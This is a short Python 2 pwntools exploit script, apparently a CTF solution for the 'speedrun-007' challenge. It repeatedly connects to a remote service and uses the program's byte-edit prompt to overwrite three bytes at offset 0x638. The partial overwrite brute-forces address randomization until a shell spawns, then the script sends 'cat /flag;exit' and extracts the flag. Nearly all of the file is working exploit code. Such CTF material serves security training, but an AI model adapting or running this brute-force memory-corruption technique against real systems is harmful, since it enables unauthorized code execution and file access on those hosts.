#!/usr/bin/env python2
import sys
import time
from pwn import *

# context.log_level = logging.DEBUG

i = 0
while True:

    conn = remote(sys.argv[1], int(sys.argv[2]))

    # conn = process("./speedrun-007")
    # gdb.attach(conn, '''
    # continue
    # ''')

    conn.recvuntil("What do you have this time")

    conn.send("a")

    conn.recvuntil("Changes you'd like to make (y/n)?")

    conn.send("y")

    # Offset is 0x638

    offset = 0x638

    conn.send(p16(offset))
    conn.send(chr(0x22))

    conn.recvuntil("Changes you'd like to make (y/n)?")

    conn.send("y")

    conn.send(p16(offset+1))
    conn.send(chr(0x33))

    conn.recvuntil("Changes you'd like to make (y/n)?")

    conn.send("y")

    conn.send(p16(offset+2))
    conn.send(chr(0xa3))

    conn.recvuntil("Changes you'd like to make (y/n)?")

    conn.send("n")

    conn.recvuntil('L8R.')

    try:
        conn.sendline('cat /flag;exit')
        result = conn.recvall(timeout=2)
    except:
        i += 1
        continue

    flag = re.search('OOO{[^}]+}', result)

    if flag:
        print("Found it on try %s" % i)
        print("FLAG: %s" % flag.group(0))
        conn.close()
        break
    else:
        print("try %s failed" % i)
    i += 1
    

    


    

    

    
